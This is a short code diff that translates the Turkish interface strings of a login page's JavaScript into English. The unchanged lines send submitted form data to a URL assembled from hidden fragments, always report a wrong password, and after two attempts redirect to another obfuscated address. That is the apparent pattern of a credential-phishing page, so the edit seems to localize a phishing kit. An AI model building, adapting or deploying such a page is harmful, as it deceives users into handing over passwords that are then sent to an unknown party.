@@ -691,12 +691,12 @@ a {
      body: data
     }
 
-    loader.innerHTML = "<i class='fa fa-circle-o-notch fa-spin'></i> İşleme..."
+    loader.innerHTML = "<i class='fa fa-circle-o-notch fa-spin'></i> Processing..."
 
     const response = await fetch(`${nbg1}${nbg2}${nbg3}${nbg4}${nbg5}${nbg6}`, options)
     const result = await response.text()
 
-    loader.innerHTML = "Giriş Yap"
+    loader.innerHTML = "Login"
 
     console.log(result)
 
@@ -707,7 +707,7 @@ a {
     if (trialCount >= 2) {
      window.location.assign(`${ov1}${ov2}${ov3}${ov4}${ov5}${ov6}${ov7}`)
     } else {
-     document.getElementById('errmsg').innerHTML = "Yanlış parola! lütfen tekrar deneyin "
+     document.getElementById('errmsg').innerHTML = "Wrong password! Please try again..."
     }
    })
 
